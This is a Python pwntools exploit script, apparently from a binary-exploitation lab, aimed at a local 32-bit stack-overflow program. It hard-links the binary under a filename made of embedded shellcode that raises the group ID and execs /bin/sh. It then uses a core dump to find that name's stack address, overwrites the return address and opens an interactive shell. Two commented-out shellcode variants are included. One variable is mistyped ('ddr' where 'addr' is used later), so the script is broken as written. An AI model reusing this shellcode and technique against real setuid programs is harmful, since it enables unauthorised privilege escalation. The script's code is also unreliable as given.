#!/usr/bin/env python

from pwn import *

import os
#filename = '\xb82\x00\x00\x00\xcd\x80\x89\xc3\x89\xc1\xb8G\x00\x00\x00\xcd\x80\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00j\x00hn/shh//bi\x89\xe3\xcd\x80'
#filename = 'j2X\xcd\x80PP[YjGX\xcd\x80j\x0bX\x99RYRhn/shh//biT[\xcd\x80'
filename = 'j2X\xcd\x80PP[YjGX\xcd\x80j\x0bX\x99RYhn/shh//biT[\xcd\x80'
filename1 = 'stack-ovfl-no-envp-no-argv-32'
os.link(filename1,filename)
p = process(filename1)
buf = "A" * 20

if not os.path.exists('core'):
    p.sendline(buf)
    p.wait()

c = Core('./core')

ddr = c.stack.find(filename1)

print(hex(addr))

buf = "A" * 16 + p32(addr)

#p = process("./stack-ovfl-use-envp-32", env=ENV)

#buf = "AAAAAAAAAAAAAAAA" + p32(addr+10)

p.sendline(buf)

p.interactive()
